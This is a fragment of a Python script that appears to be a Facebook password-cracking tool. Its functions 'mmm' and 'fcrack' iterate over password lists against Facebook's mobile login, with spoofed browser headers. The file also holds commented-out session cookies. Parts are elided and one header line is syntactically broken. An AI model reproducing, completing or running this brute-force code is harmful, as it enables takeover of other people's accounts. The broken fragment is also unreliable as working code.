...
\033[1;37m[-] VERSION   :\033[1;32m 1.8
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			session.headers.update({"Host":"x.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=KABVZbmRcIqSUR93Rn-GvDPA; sb=KABVZRUzc8iBlrI7dfSBvebB; m_pixel_ratio=2; wd=360x676; fr=0Ybgt2TAC93TbPDTN..BlVQAo.2r.AAA.0.0.BlVQA8.AWUsvfWWYeQ',
    'dpr': '2',
...
def fcrack(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=rfcQZcjjAtSNyMQ_4FVfFTkn; sb=rfcQZemBtS48rEwwemYl78dM; vpd=v1%3B676x360x2; wl_cbv=v2%3Bclient_version%3A2336%3Btimestamp%3A1697690318; zsh=ASRc9qXMXSEkc2-T0pqEWXdZ4aSFk46Aw8D0acIarWGxxpURurK6RFZoHqNXFPGsoFVzeZNGFzaOzTdq_b0nUTf48jPzjLdwqQ6TGWXegf58GkvhS_I7iZpmT_k2eoUnjXxte4rfxsePowgSzk7mQC0DHLGknd1ViUzvkW_HAwLjcOizTbI4hloDuTqgeegxf--fRttQmOT_CUs3aSfzDaNYvCN7joQQcFVru3tlN0q6cPe9NcuP3QcGUJeLeI6qj3XhzVQM1WOuinAazd7UIeu57OL6JxVdd60K8aKpo3Fcy7NLfDySSA0ZP8JO2Q41eA; locale=en_US; m_pixel_ratio=2; wd=360x676; fr=0fUqaTnvxUKA6q8No.AWVVVDKx0G9-7lBY4SJ_jdovQTo.BlFT4J.C4.AAA.0.0.BlM1eP.AWWUxbqVmy8',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
